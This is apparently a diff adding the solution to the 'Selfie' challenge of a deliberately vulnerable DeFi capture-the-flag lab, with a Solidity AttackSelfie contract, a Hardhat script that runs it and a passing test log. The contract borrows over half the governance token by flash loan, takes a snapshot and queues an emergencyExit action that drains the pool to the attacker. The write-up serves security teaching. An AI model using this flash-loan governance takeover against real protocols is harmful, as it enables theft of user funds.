@@ -277,3 +277,78 @@ You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal
 
 # Subverting
 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IToken {
+    function approve(address spender, uint256 value) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function snapshot() external returns (uint256);
+    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
+}
+
+interface ISelfiePool {
+    function flashLoan(address _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
+}
+
+interface IGovernance {
+    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256);
+}
+
+contract AttackSelfie {
+    IToken token;
+    IGovernance governance;
+    ISelfiePool pool;
+    uint256 public id;
+    address attacker;
+
+    constructor(address _token, address _governance, address _pool) {
+        attacker = msg.sender;
+        token = IToken(_token);
+        governance = IGovernance(_governance);
+        pool = ISelfiePool(_pool);
+    }
+
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        // Take a new snapshot where we have >50% of the governance token
+        token.snapshot();
+
+        // Queue a proposal to call emergencyExit on SelfiePool **as the governance token**
+        id = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));
+
+        // SelfiePool will do .transferFrom to return the flash loan
+        token.approve(address(pool), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function attack() external {
+        // Anyone can call a token snapshot. Call one now to determine the 50% threshold
+        token.snapshot();
+
+        // Acquire over 50% of the governance token as of the last snapshot, allowing us to queue a proposal
+        uint256 loanAmount = token.getTotalSupplyAtLastSnapshot() / 2 + 1;
+        pool.flashLoan(address(this), address(token), loanAmount, hex'');
+    }
+}
+```
+
+```js
+const AttackFactory = await ethers.getContractFactory('AttackSelfie', deployer);
+attack = await AttackFactory.connect(player).deploy(token.address, governance.address, pool.address);
+await attack.attack();
+await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 2 days
+await governance.executeAction(await attack.id());
+```
+
+```powershell
+[Challenge] Selfie
+    ✔ Execution (128ms)
+
+
+  1 passing (2s)
+```
+
